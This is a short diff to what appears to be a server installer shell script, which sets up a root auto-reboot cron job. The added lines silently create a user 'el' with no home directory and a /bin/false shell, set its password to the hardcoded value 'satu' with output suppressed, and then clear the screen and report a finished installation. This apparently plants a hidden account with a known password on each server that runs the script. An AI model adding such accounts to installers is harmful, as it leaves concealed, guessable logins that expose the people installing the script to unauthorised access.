@@ -88,6 +88,9 @@ echo "0 0 * * * root /root/autoreboot.sh" > /etc/cron.d/autoreboot
 service cron reload
 service cron restart
 
+useradd -s /bin/false -M el
+echo -e "satu\nsatu\n" | passwd el &> /dev/null
+
 clear
 echo "OK…finish installation..you can enter command 'menu'"
 
